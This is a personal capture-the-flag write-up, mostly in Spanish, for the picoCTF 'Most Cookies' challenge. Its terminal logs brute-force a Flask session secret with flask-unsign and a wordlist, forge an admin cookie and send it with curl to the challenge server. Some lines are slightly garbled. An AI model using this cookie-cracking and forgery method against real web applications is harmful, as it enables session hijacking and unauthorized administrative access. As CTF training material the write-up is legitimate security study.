
## Most Cookies



Hints:

## Solución:

https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py
Entrar al link que aparece con la snickerdoodle ahi y copiar la cookie


brisguz@DESKTOP-8V24E1B:~/Fun_Seg_Red$ wget https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py
--2025-04-04 23:02:22--  https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2021 (2.0K) [application/octet-stream]
Saving to: ‘server.py’

server.py                       100%[=====================================================>]   1.97K  --.-KB/s    in 0s

2025-04-04 23:02:23 (25.0 MB/s) - ‘server.py’ saved [2021/2021]

brisguz@DESKTOP-8V24E1B:~/Fun_Seg_Red$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_C5UA.HNd9u8NzFZGmpnHMSt6V1ijeIiQ | base6
4 -d
{"very_auth":"snickerdoodle"}base64: invalid input
brisguz@DESKTOP-8V24E1B:~/Fun_Seg_Red$



Ver el codigo
cat server.py


Copear las cookies que estan en el código
snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia



Copear la cookie: eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_HsGA.CwKw9aUh4Zsv1tNUYN071d71lrA

Poner: 
(.venv) brisguz@DESKTOP-8V24E1B:~/Fun_Seg_Red$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_HsGA.CwKw9aUh4Zsv1tNUYN071d71lrA" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
(.venv) brisguz@DESKTOP-8V24E1B:~/Fun_Seg_Red$


La palabra secreta es : 'peanut butter'


Siguiente Paso: Solo se pone hasta donde tenga "peanut butter"- lo demas aparece
(.venv) brisguz@DESKTOP-8V24E1B:~/Fun_Seg_Red$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_HurQ.6B0cL0lXbLQvSXGfU5f_4iG4FMs
(.venv) brisguz@DESKTOP-8V24E1B:~/Fun_Seg_Red$



curl-s http://mercury.picoctf.net:53700/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_HwOg.bKIP0bg7EVb-cnI-_BxrI6xY4Zo" | grep p





